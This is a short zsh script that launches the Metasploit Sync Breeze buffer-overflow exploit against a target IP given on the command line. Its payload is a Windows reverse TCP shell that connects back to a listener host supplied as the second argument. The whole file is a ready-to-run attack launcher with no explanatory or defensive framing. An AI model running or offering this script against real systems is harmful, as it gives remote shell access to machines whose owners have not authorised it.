#!/usr/bin/zsh
if [[ $# -ne 2 ]]; then
    echo "ERR: Need two arguments"
    echo "Usage: $0 <target IP> <source IP>"
    exit 2
fi
echo "Initiating... please wait"
msfconsole -q -x "use exploit/windows/http/syncbreeze_bof; set PAYLOAD windows/shell_reverse_tcp; set RHOST $1; set RPORT 8080; set LHOST $2; set EXITFUNC thread; run; exit";
